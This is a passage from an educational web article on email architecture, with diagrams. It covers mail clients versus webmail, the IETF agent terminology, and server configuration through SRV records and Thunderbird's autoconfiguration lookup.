    <text text-anchor="middle">
        <tspan x="377" y="172.9"><tspan>Code</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="84" y="-18.5"><tspan>Web</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="332" y="-18.5"><tspan>Mail</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="208" y="103.9"><tspan>vs.</tspan></tspan>
    </text>

</svg>

    <figcaption>
On the left, the code to interact with the data comes from the server.
On the right, the logic is inside the client and only data is exchanged.
</figcaption>
  </figure>

  <p>If you need additional features,
such as <a href="#end-to-end-security">end-to-end encryption</a> or interaction with a service from a different provider,
you have to find workarounds with <a href="https://en.wikipedia.org/wiki/Browser_extension">browser extensions</a>.
<a href="https://en.wikipedia.org/wiki/Open_source">Open-source</a> mail clients, on the other hand, can be modified at will.
In order to give you more control over your messages,
most mailbox providers offer an <a href="https://en.wikipedia.org/wiki/API">application programming interface (<abbr title="Application Programming Interface">API</abbr>)</a> for
access to your mailbox, such as <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> or <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a>.
In the case of Gmail, you have to <a href="https://support.google.com/mail/answer/7126229">enable the <abbr title="Application Programming Interface">API</abbr></a>
through the web interface for your account before a mail client can use it.</p>

  <p>When it comes to security, there’s no clear winner.
Webmail has the advantage that you always run the newest version of the code,
which is <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">sandboxed</a>
from the rest of your system by the web browser.
On the downside, attacks like <a href="#phishing">phishing</a>,
<a href="https://en.wikipedia.org/wiki/Cross-site_scripting">cross-site scripting</a>,
and <a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">cross-site request forgery</a>
are only possible because the browser runs untrusted code,
which a dedicated mail client doesn’t.
Whether you access your emails via the Web or via a local mail client is a matter of individual preference.</p>

  <p>As we’ve learned in the <a href="#standardization">previous box</a>,
how users interact with their mail client isn’t standardized.
Webmail is thus of no interest for the scope of this article.
All you need to know is that email has nothing to do with the Web.
Both are independent services that run over the Internet.
Moreover, email is <a href="https://evalapply.org/internet/#internet-history">older than the Web</a>:
<a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr></a> was first defined in <a href="https://datatracker.ietf.org/doc/html/rfc822">1982</a>,
<a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol">POP</abbr></a> in <a href="https://datatracker.ietf.org/doc/html/rfc918">1984</a>,
and <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>
in <a href="https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol#History">1986</a>.
The <a href="https://evalapply.org/internet/#hypertext-transfer-protocol">HyperText Transfer Protocol (<abbr title="HyperText Transfer Protocol">HTTP</abbr>)</a>, which underpins the Web,
was introduced <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#History">around 1990</a>.</p>

</details>

<h3 id="official-architecture">Official architecture</h3>

<p>For the sake of completeness and to enable you to understand the linked articles,
this subsection covers the official terminology as used, for example, in <a href="https://datatracker.ietf.org/doc/html/rfc5598"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5598</a>.
In the official documents, there are five instead of three entities,
with each of them having a more complicated name and, of course, an associated
<a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronym (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>:</p>

<figure>

  <table>
    <thead>
      <tr>
        <th><abbr title="Three-Letter Acronym">TLA</abbr></th>
        <th>Name</th>
        <th>Description</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><abbr title="Mail User Agent (your mail app)">MUA</abbr></td>
        <td><a href="https://en.wikipedia.org/wiki/Mail_user_agent">Mail user agent</a></td>
        <td>Client to compose, send, receive, and read emails, such as</td>
      </tr>
      <tr>
        <td><abbr title="Mail Submission Agent (your outgoing mail server requiring authentication)">MSA</abbr></td>
        <td><a href="https://en.wikipedia.org/wiki/Mail_submission_agent">Mail submission agent</a></td>
        <td>Server to receive outgoing emails from authenticated users</td>
      </tr>
      <tr>
        <td><abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr></td>
        <td><a href="https://en.wikipedia.org/wiki/Mail_transfer_agent">Mail transfer agent</a></td>
        <td>Server to deliver the queued emails and to receive them on the other end.</td>
      </tr>
      <tr>
        <td><abbr title="Mail Delivery Agent (your incoming mail server applying rules)">MDA</abbr></td>
        <td><a href="https://en.wikipedia.org/wiki/Mail_delivery_agent">Mail delivery agent</a></td>
        <td>Server to receive emails from the local mail transfer agent (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>)</td>
      </tr>
      <tr>
        <td><abbr title="Message Store">MS</abbr></td>
        <td><a href="https://en.wikipedia.org/wiki/Email_box">Message store</a></td>
        <td>Server to store the emails received from the mail delivery agent (<abbr title="Mail Delivery Agent (your incoming mail server applying rules)">MDA</abbr>)</td>
      </tr>
    </tbody>
  </table>

  <figcaption>

The terminology used by the
<a href="https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force">Internet Engineering Task Force (<abbr title="Internet Engineering Task Force">IETF</abbr>)</a>
in its official documents, such as <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>.
The terms in italics are used in some newer documents,
such as <a href="https://datatracker.ietf.org/doc/html/rfc8314#section-2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8314</a>.
I added them because I like them better.

</figcaption>
</figure>

<p>These terms are not as precise as they seem to be and the boundaries are often fluid in practice.
Having more entities also changes the architecture.
What follows is a nicer version of <a href="https://datatracker.ietf.org/doc/html/rfc5598#page-23">this <abbr title="American Standard Code for Information Interchange">ASCII</abbr> graphic</a>,
which is a masterpiece to be appreciated in its own right.</p>

<figure>
  <svg id="figure-official-architecture" data-name="official-architecture" width="712.5" height="374" viewBox="-1.25 -42.75 712.5 374" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="555" y1="259.688" x2="640" y2="171.25" marker-end="url(#arrow-blue)" stroke-dasharray="116"></line>
    <line x1="155" y1="259.688" x2="70" y2="171.25" marker-end="url(#arrow-blue)" stroke-dasharray="116"></line>
    <line x1="640" y1="70.313" x2="640" y2="98.75" marker-end="url(#arrow-green)" stroke-dasharray="21"></line>
    <line x1="540.313" y1="35" x2="568.75" y2="35" marker-end="url(#arrow-green)" stroke-dasharray="21"></line>
    <line x1="310.313" y1="35" x2="398.75" y2="35" marker-end="url(#arrow-green)" stroke-dasharray="81"></line>
    <line x1="240" y1="99.688" x2="240" y2="71.25" marker-end="url(#arrow-green)" stroke-dasharray="21"></line>
    <line x1="155" y1="259.688" x2="240" y2="171.25" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <rect x="85" y="260" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="155" y="289.9"><tspan>Mail user</tspan></tspan><tspan x="155" y="311.9"><tspan>agent <tspan>(mua)</tspan></tspan></tspan>
    </text>
    <rect x="170" y="100" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="240" y="129.9"><tspan>Mail submission</tspan></tspan><tspan x="240" y="151.9"><tspan>agent <tspan>(msa)</tspan></tspan></tspan>
    </text>
    <rect x="170" y="0" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="240" y="29.9"><tspan>Mail transfer</tspan></tspan><tspan x="240" y="51.9"><tspan>agent <tspan>(mta)</tspan></tspan></tspan>
    </text>
    <rect x="0" y="0" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="70" y="29.9"><tspan>Mail delivery</tspan></tspan><tspan x="70" y="51.9"><tspan>agent <tspan>(mda)</tspan></tspan></tspan>
    </text>
    <rect x="0" y="100" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="70" y="129.9"><tspan>Message</tspan></tspan><tspan x="70" y="151.9"><tspan>store <tspan>(ms)</tspan></tspan></tspan>
    </text>
    <rect x="485" y="260" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="555" y="289.9"><tspan>Mail user</tspan></tspan><tspan x="555" y="311.9"><tspan>agent <tspan>(mua)</tspan></tspan></tspan>
    </text>
    <rect x="400" y="100" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="470" y="129.9"><tspan>Mail submission</tspan></tspan><tspan x="470" y="151.9"><tspan>agent <tspan>(msa)</tspan></tspan></tspan>
    </text>
    <rect x="400" y="0" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="470" y="29.9"><tspan>Mail transfer</tspan></tspan><tspan x="470" y="51.9"><tspan>agent <tspan>(mta)</tspan></tspan></tspan>
    </text>
    <rect x="570" y="0" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="640" y="29.9"><tspan>Mail delivery</tspan></tspan><tspan x="640" y="51.9"><tspan>agent <tspan>(mda)</tspan></tspan></tspan>
    </text>
    <rect x="570" y="100" width="140" height="70" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="640" y="129.9"><tspan>Message</tspan></tspan><tspan x="640" y="151.9"><tspan>store <tspan>(ms)</tspan></tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="155" y="-30"><tspan>Sender</tspan></tspan>
    </text>
    <text text-anchor="middle">
        <tspan x="555" y="-30"><tspan>Recipient</tspan></tspan>
    </text>

</svg>

  <figcaption>

The official <a href="https://datatracker.ietf.org/doc/html/rfc5598">Internet Mail Architecture</a>
with <a href="#simple-mail-transfer-protocol"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> connections</a> in green
and <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr> connections</a> in blue.

</figcaption>
</figure>

<p>None of the servers have to be a single machine.
In addition, the incoming <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr> and the outgoing <abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr> don’t have to be the same.</p>

<h2 id="entities">Entities</h2>

<p>There are three entities in the simplified architecture:
the <a href="#mail-client">mail client</a>,
the <a href="#outgoing-mail-server">outgoing mail server</a>,
and the <a href="#incoming-mail-server">incoming mail server</a>.</p>

<h3 id="mail-client">Mail client</h3>

<p>The mail client is a computer program to compose, send, retrieve, and read emails.
It provides the interface through which users handle email.
The mail client runs either locally on the user’s device or remotely <a href="#webmail">on a web server</a>.
Examples of the former kind are
<a href="https://en.wikipedia.org/wiki/Microsoft_Outlook">Microsoft Outlook</a>,
<a href="https://en.wikipedia.org/wiki/Apple_Mail">Apple Mail</a>, and
<a href="https://en.wikipedia.org/wiki/Mozilla_Thunderbird">Mozilla Thunderbird</a>.
Examples of the latter are <a href="https://en.wikipedia.org/wiki/Gmail">Google Gmail</a> and
<a href="https://en.wikipedia.org/wiki/Yahoo!_Mail">Yahoo! Mail</a> when accessed through a web browser.
(Both companies also provide <a href="https://www.google.com/gmail/about/">mobile</a>
<a href="https://mobile.yahoo.com/mail">apps</a> for <a href="https://en.wikipedia.org/wiki/Android_(operating_system)">Android</a>
and <a href="https://en.wikipedia.org/wiki/IOS">iOS</a>, which fall into the former category.)</p>

<p>The mail client connects to the outgoing mail server to submit messages for delivery to other users
and to the incoming mail server to fetch new messages from the user’s mailbox.
Both servers authenticate the user, typically with a username and a password.
The mail client connects to the incoming mail server through a different interface than outgoing mail servers do,
which can be seen on the recipient’s side of the <a href="#simplified-architecture">simplified mail architecture</a>:</p>

<figure>
  <svg id="figure-simplified-architecture-incoming-interfaces" data-name="simplified-architecture-incoming-interfaces" width="599.148" height="298.25" viewBox="-131.662 -5 599.148 298.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <path d="M -0.312,250.25 A 77.394 165.5 0 0 1 -77.706,84.75 L -77.706447,84.740008" marker-end="url(#arrow-gray)" stroke-dasharray="190"></path>
    <text text-anchor="end">
        <tspan x="-60.121" y="224.146"><tspan>imap</tspan> for</tspan><tspan x="-60.121" y="246.146">message</tspan><tspan x="-60.121" y="268.146">storage</tspan>
    </text>
    <line x1="283.118" y1="208.188" x2="283.118" y2="84.75" marker-end="url(#arrow-blue)" stroke-dasharray="116"></line>
    <text text-anchor="start">
        <tspan x="295.118" y="129.9"><tspan>imap</tspan> or <tspan>pop3</tspan></tspan><tspan x="295.118" y="151.9">for message</tspan><tspan x="295.118" y="173.9">retrieval</tspan>
    </text>
    <line x1="105.725" y1="41.75" x2="229.162" y2="41.75" marker-end="url(#arrow-green)" stroke-dasharray="116"></line>
    <text text-anchor="middle">
        <tspan x="167.912" y="7.75"><tspan>smtp</tspan> for</tspan><tspan x="167.912" y="29.75">message relay</tspan>
    </text>
    <line x1="52.706" y1="208.188" x2="52.706" y2="84.75" marker-end="url(#arrow)" stroke-dasharray="116"></line>
    <text text-anchor="end">
        <tspan x="40.706" y="129.9"><tspan>smtp</tspan> for</tspan><tspan x="40.706" y="151.9">message</tspan><tspan x="40.706" y="173.9">submission</tspan>
    </text>
    <rect x="0" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="52.706" y="267.15">of sender</tspan>
    </text>
    <rect x="0" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="52.706" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="52.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="52.706" y="69.65">of sender</tspan>
    </text>
    <rect x="230.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="283.118" y="47.65"><tspan>mail server</tspan></tspan><tspan x="283.118" y="69.65">of recipient</tspan>
    </text>
    <rect x="230.412" y="208.5" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="283.118" y="245.15"><tspan>Mail client</tspan></tspan><tspan x="283.118" y="267.15">of recipient</tspan>
    </text>
    <rect x="-130.412" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="-77.706" y="25.65"><tspan>Incoming</tspan></tspan><tspan x="-77.706" y="47.65"><tspan>mail server</tspan></tspan><tspan x="-77.706" y="69.65">of sender</tspan>
    </text>
    <rect x="360.824" y="0" width="105.412" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="413.53" y="25.65"><tspan>Outgoing</tspan></tspan><tspan x="413.53" y="47.65"><tspan>mail server</tspan></tspan><tspan x="413.53" y="69.65">of recipient</tspan>
    </text>

</svg>

  <figcaption>

The recipient’s mail client connects to the incoming mail server
using a different <a href="#port-numbers">port</a> and <a href="#access-protocols">protocol</a> than outgoing mail servers.
It’s usually also a different machine with a different domain name and <abbr title="Internet Protocol">IP</abbr> address
than the one outgoing mail servers connect to.

</figcaption>
</figure>

<p>This distinction is apparent in the <a href="#official-architecture">official mail architecture</a>,
where the message store (<abbr title="Message Store">MS</abbr>) and the mail transfer agent (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>) reside in different boxes.
By giving the impression that the incoming mail server is a single machine,
the simplified model doesn’t explain why the incoming mail server needs to be configured
in the mail client of its user but not in the outgoing mail servers of other users.
Since the simplified architecture is less confusing in every other regard,
it’s still the preferred model for the scope of this article.</p>

<details>
  <summary id="configuration">
Configuration
</summary>

  <p>When you add an email account to your mail client,
you usually have to configure the incoming mail server and the outgoing mail server manually,
unless you use a <a href="#popular-mailbox-providers">popular mailbox provider</a>.
If manual configuration is required,
you have to look through the documentation of your mailbox provider
to find the domain names of the two servers
and then copy the information to the respective fields in your mail client.
While most mailbox providers use the <a href="#port-numbers">default port numbers</a>,
which means that you usually don’t have to configure them,
the domain names of the two servers aren’t standardized.
It’s often the case that their addresses are
subdomains of the domain after the @ symbol in your email address,
such as <code>imap.gmail.com</code> and <code>smtp.gmail.com</code> for <code>@gmail.com</code>.
However, many organizations don’t host their emails themselves,
in which case the domains of the two servers are likely
completely different from the organization’s domain.
This is the case for my email configuration:</p>

  <figure>
    <p><img src="https://evalapply.org/pages/email/generated/email-settings-automatic.light.png"/>
<img src="https://evalapply.org/pages/email/generated/email-settings-automatic.dark.png"/>
    

</p>

    <figcaption>The simplified email architecture corresponds to what mail clients like Apple Mail display to you.</figcaption>

  </figure>

  <p>One more thing that users need to be informed about is whether to use the full email address
or only the local part before the @ symbol (or even something completely different) as the username.
While flexibility is great for customizing a setup to the particular needs of an organization,
it also leads to an unnecessarily complicated experience for users.</p>

</details>

<details>
  <summary id="custom-domains">
Custom domains
</summary>

  <p>Please note that you cannot simply set up <a href="https://en.wikipedia.org/wiki/CNAME_record"><code>CNAME</code> records</a>
in your own domain for the incoming and outgoing mail servers
if you want to avoid instructing your users to use an external domain
because the <a href="https://evalapply.org/internet/#transport-layer-security"><abbr title="Transport Layer Security">TLS</abbr></a> <a href="https://evalapply.org/internet/#public-key-infrastructure">certificates</a>
used by the mailbox provider would no longer match.
For example, if I point <code>imap.ef1p.com</code> to <code>mail.gandi.net</code> with a <code>CNAME</code> record in my <abbr title="Domain Name System">DNS</abbr> zone
and use the former in the <a href="#configuration">server settings</a>,
then my mail client expects the <abbr title="Transport Layer Security">TLS</abbr> certificate to be issued for <code>imap.ef1p.com</code>
and aborts the connection when it receives a certificate for <code>mail.gandi.net</code>.
Besides vanity, such a setup could be desirable
because it would allow the <abbr title="Information Technology">IT</abbr> administrator of an organization
to migrate all messages to another mailbox provider
without requiring every member of the organization to change their email settings.
This can be realized with the technique that I cover in the <a href="#autoconfiguration">next box</a>.</p>

</details>

<details>
  <summary id="autoconfiguration">
Autoconfiguration
</summary>

  <p>Wouldn’t it be nice if mail clients could configure themselves automatically
by fetching the required information directly from the mailbox providers?
The good news is that we have a standard for exactly this purpose.
The bad news is that almost no one is using it, even though it’s simple and elegant.
<a href="https://datatracker.ietf.org/doc/html/rfc6186"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6186</a> defines
how to use <a href="https://en.wikipedia.org/wiki/SRV_record"><code>SRV</code> records</a>
in the <a href="https://evalapply.org/internet/#domain-name-system">Domain Name System (<abbr title="Domain Name System">DNS</abbr>)</a>
for locating email submission and access services.
Using <abbr title="Domain Name System">DNS</abbr> for fetching the required information is elegant because
the <a href="#protocols">email protocols</a> already depend on <abbr title="Domain Name System">DNS</abbr>,
the information is provided by the owner of the domain,
and the system scales well thanks to the caching of answers by intermediary resolvers.</p>

  <p>However, if the answers are not authenticated with <a href="https://evalapply.org/internet/#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>,
an attacker who can spoof <abbr title="Domain Name System">DNS</abbr> responses can direct the mail client to malicious servers.
This attack vector is really bad because <abbr title="Transport Layer Security">TLS</abbr> doesn’t prevent it
(the malicious servers can have valid certificates for their domains)
and because <a href="#user-authentication">passwords are often transmitted in cleartext</a>
over the encrypted channel instead of using non-reusable
<a href="https://en.wikipedia.org/wiki/Challenge%E2%80%93response_authentication">challenge-response authentication</a>,
such as <a href="#salted-challenge-response-authentication-mechanism"><abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr></a>.
The attacker can thus authenticate as the user to the legitimate servers
beyond the duration of the attack until the user changes their password.
The <a href="https://datatracker.ietf.org/doc/html/rfc6186#section-6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> just says</a> that
the domain names of the servers should be confirmed by the user
if they are not subdomains of the queried domain without requiring or even mentioning <abbr title="Domain Name System Security Extensions">DNSSEC</abbr>.
As everyone working in <abbr title="Information Technology">IT</abbr> security knows, security-critical decisions should not be left to users.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc2782"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2782</a> specifies the format of service (<code>SRV</code>) records.
The basic idea is to use a different subdomain for each protocol and service and list the port number and
domain name of the host which provides the particular service in the data field of the resource record.
The subdomain is constructed as follows: <code>_service._protocol.domain</code>,
where <code>domain</code> is the domain part of the email address, <code>_protocol</code> is <code>_tcp</code>,
and <code>_service</code> is <code>_submission</code>/<code>_submissions</code>, <code>_imap</code>/<code>_imaps</code>, or <code>_pop3</code>/<code>_pop3s</code> in the case of email.
The data of <code>SRV</code> records consist of a priority number, a weight number, a port number,
and the domain name of the target host separated by a single space.
If several records are returned, the client has to connect to the host with the lowest priority number first
and fall back to the host with the next higher priority number
only if all hosts with lower priority numbers are unreachable.
If there are several records with the same priority,
the client should select one at random proportionally to its weight.
This can be useful to <a href="https://en.wikipedia.org/wiki/Load_balancing_(computing)">balance the load</a> among several hosts.
If there isn’t any server selection to do, then the weight should be set to zero.
For example, if you have the <a href="https://en.wikipedia.org/wiki/Dig_(command)">dig command</a>
installed in your <a href="https://en.wikipedia.org/wiki/Command-line_interface">command-line interface (<abbr title="Command-Line Interface">CLI</abbr>)</a>,
executing <code>dig srv _submission._tcp.gmail.com +short</code> returns <code>5 0 587 smtp.gmail.com.</code>.
This means that mail clients should submit outgoing emails
to <code>smtp.gmail.com</code> on port 587 when using <code>gmail.com</code>.
If the host name is <code>.</code>, the service is explicitly not available at this domain.
For example, running <code>dig srv _imap._tcp.gmail.com +short</code> returns <code>0 0 0 .</code>
because Gmail supports <abbr title="Internet Message Access Protocol">IMAP</abbr> only with <a href="#use-of-tls">Implicit <abbr title="Transport Layer Security">TLS</abbr></a>, which is usually called <abbr title="Internet Message Access Protocol Secure">IMAPS</abbr>.</p>

  <p>You can check the email service records of a domain with the following tool,
which uses an <a href="https://developers.google.com/speed/public-dns/docs/doh/json"><abbr title="Application Programming Interface">API</abbr> by Google</a> for its <abbr title="Domain Name System">DNS</abbr> queries:</p>

  

  <p>If you played around with the above tool for a while,
you might have realized that not many domains have service records for email.
Probably for this reason, none of the major mail clients actually
<a href="https://stackoverflow.com/questions/60298006/what-major-e-mail-clients-actually-make-use-of-dns-srv-autoconfiguration">use this autoconfiguration method</a>.
In my opinion, this is really unfortunate but not surprising given that
only supply can generate demand and only demand can generate supply.</p>

  <p>I can see only three potential weaknesses with this standard:</p>
  <ol>
    <li>Service records make the incoming and outgoing mail servers publicly known.
For public mail services, where anyone can create an account, this is the case anyway.
For private mail services, on the other hand,
such knowledge makes attacks on the infrastructure easier
if the mail servers cannot be guessed otherwise.</li>
    <li>Service records provide no information about the <a href="#configuration">username</a>
and the <a href="#user-authentication">authentication method</a>.
The latter can be discovered, though, simply by connecting to the server
and inquiring about its <a href="#common-smtp-extensions">supported extensions</a>.</li>
    <li>The provided information cannot depend on the local part of the email address
since <abbr title="Domain Name System">DNS</abbr> queries don’t support additional parameters.
There are autoconfiguration protocols which support this,
such as <a href="#configuration-database">the one used by Thunderbird</a>.</li>
  </ol>

  <p>Besides improving the experience of users,
service records make it possible to migrate an organization to another mailbox provider
without requiring every member of the organization to change their email settings.
According to <a href="https://datatracker.ietf.org/doc/html/rfc6186#section-4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6186</a>,
mail clients should cache the resolved hosts
until they can no longer establish a connection or user authentication fails.
When either of these happen,
mail clients are supposed to fetch the <code>SRV</code> records of the same <code>_service</code> again.
Mail clients may not switch from <abbr title="Internet Message Access Protocol">IMAP</abbr> to <abbr title="Post Office Protocol version 3">POP3</abbr> or vice versa without the user’s consent.</p>

  <p>If you want to configure <code>SRV</code> records for your domain,
you can put the following entries into your <a href="https://en.wikipedia.org/wiki/Zone_file">zone file</a>:</p>

  <figure>

    <div><div><pre><code>_imap._tcp 10800 IN SRV 0 0 143 {Domain}.
_imaps._tcp 10800 IN SRV 0 0 993 {Domain}.
_jmap._tcp 10800 IN SRV 0 0 443 {Domain}.
_pop3._tcp 10800 IN SRV 0 0 110 {Domain}.
_pop3s._tcp 10800 IN SRV 0 0 995 {Domain}.
_sieve._tcp 10800 IN SRV 0 0 4190 {Domain}.
_submission._tcp 10800 IN SRV 0 0 587 {Domain}.
_submissions._tcp 10800 IN SRV 0 0 465 {Domain}.
</code></pre></div>    </div>

    <figcaption>

Insert the appropriate <code>Domain</code> and use <code>0 0 0 .</code> for all the services
which are not supported by your mailbox provider.

</figcaption>
  </figure>

</details>

<details>
  <summary id="configuration-database">
Configuration database
</summary>

  <p>At this point, you may be wondering how mail clients can often figure out the correct configuration by themselves
despite the lack of an established standard.
Most mail clients look up the configuration for <a href="#popular-mailbox-providers">popular mailbox providers</a>
in a database, which is either delivered with the client or centrally hosted by the software manufacturer.
Some mail clients also use custom autoconfiguration protocols,
which typically fetch an <a href="https://en.wikipedia.org/wiki/XML"><abbr title="Extensible Markup Language">XML</abbr></a> file hosted at a specific subdomain via <abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr>.</p>

  <p>Let’s have a look at how <a href="https://www.thunderbird.net/en-US/">Thunderbird</a> does it.
Its autoconfiguration process is
<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Thunderbird/Autoconfiguration">well documented</a>
and its configuration database is free to use for any mail client.
Given an email address <code>{Address}</code> <code>=</code> <code>{LocalPart}@{Domain}</code>,
Thunderbird goes through the following steps from top to bottom until it finds a suitable configuration:</p>
  <ol>
    <li>Check the installation directory for a
<a href="https://developer.mozilla.org/en-US/docs/Mozilla/Thunderbird/Autoconfiguration/FileFormat/HowTo">configuration file</a>.
This is useful for when the employer administrates the user’s device.</li>
    <li>Check <code>https://autoconfig.{Domain}/mail/config-v1.1.xml?emailaddress={Address}</code> for a configuration file.
Unlike the mechanism discussed in the <a href="#autoconfiguration">previous box</a>,
this file can be generated dynamically based on the email address.
This is useful for when the username is neither the email address nor the local part.</li>
    <li>Check <code>https://{Domain}/.well-known/autoconfig/mail/config-v1.1.xml</code>.
The key difference between this and the previous lookup is that
the <code>autoconfig</code> subdomain in step 2 can point to a web server operated by your mailbox provider,
while the lookup in the current step must be handled by the <code>Domain</code> itself.</li>
    <li>Look for a configuration file in the central database at <code>https://autoconfig.thunderbird.net/v1.1/{Domain}</code>.</li>
    <li>Look up the <a href="#address-resolution"><code>MX</code> record</a> of the domain in the Domain Name System
and then check whether the central database has an entry for the so-called apex domain
at the root of the <a href="https://en.wikipedia.org/wiki/DNS_zone">zone</a>.
This is useful for custom domains like <code>ef1p.com</code>,
which has an <code>MX</code> record pointing to <code>spool.mail.gandi.net</code>,
which belongs to the zone starting at <code>gandi.net</code>.
The central database has an <a href="https://autoconfig.thunderbird.net/v1.1/gandi.net">entry for <code>gandi.net</code></a>,
which is how Thunderbird would find the configuration for my email address.</li>
    <li>If all previous attempts to find a configuration failed,
Thunderbird resorts to guessing the mail servers.
It tries to connect to common server names such as <code>mail.{Domain}</code>, <code>smtp.{Domain}</code>, and <code>imap.{Domain}</code>
on the <a href="#port-numbers">default port numbers</a> and checks whether they support <abbr title="Transport Layer Security">TLS</abbr> or <a href="#starttls-extension"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr></a>
and the <a href="#challenge-response-authentication-mechanism">challenge-response authentication mechanism (<abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr>)</a>.
The last check prevents Thunderbird from accidentally revealing the user’s password to the wrong server.
Unfortunately, <abbr title="Challenge-Response Authentication Mechanism">CRAM</abbr> is rather weak.
The far better <a href="#salted-challenge-response-authentication-mechanism">salted challenge-response authentication mechanism (<abbr title="Salted Challenge-Response Authentication Mechanism">SCRAM</abbr>)</a> should be used instead.</li>
    <li>If all of the above steps fail, the user has to enter the configuration themself.</li>
  </ol>

  <p>I’ve implemented steps 2 to 5 of Thunderbird’s discovery procedure
in case you need to configure a mail client and don’t know the required information.
The tool makes requests to the entered domain according to the above description
and, if necessary, to <a href="https://autoconfig.thunderbird.net/v1.1/">Thunderbird’s database</a>.
If the fifth step is also needed, the <abbr title="Domain Name System">DNS</abbr> queries are made with
<a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>.
Please note that the requests are sent directly from your browser,
which means that the lookups fail if the server does not allow
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">cross-origin resource sharing (<abbr title="Cross-Origin Resource Sharing">CORS</abbr>)</a> with an
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin"><code>Access-Control-Allow-Origin</code></a>
header field value of <code>*</code>.
Since such a header field is not required for mail clients, this is often not the case.
For this reason, the <a href="https://evalapply.org/email/tools/#protocols">protocol tools</a> query only Thunderbird’s database.</p>

  

</details>

<h3 id="outgoing-mail-server">Outgoing mail server</h3>

<p>The outgoing mail server accepts messages from mail clients and queues them for delivery.
It then <a href="#address-resolution">determines the incoming mail server</a>
of each recipient and delivers the message to them.
The outgoing mail server acts as a server in the interaction with mail clients
but assumes the <a href="https://evalapply.org/internet/#client-server-model">role of a client</a>
when relaying the message to incoming mail servers.
(Connections are always initiated by clients.)
If the outgoing mail server cannot deliver a message,
it sends a <a href="#bounce-messages">bounce message</a> to the user who submitted the message.
While the outgoing mail server should not change the content of a message,
it adds <a href="#trace-information">information about the submitter</a> at the top.
Before accepting a message,
the outgoing mail server authenticates the user,
typically based on a username and a password.</p>

<details>
  <summary id="why-outgoing-mail-servers">
Why do we need outgoing mail servers when mail clients could simply deliver the messages directly?
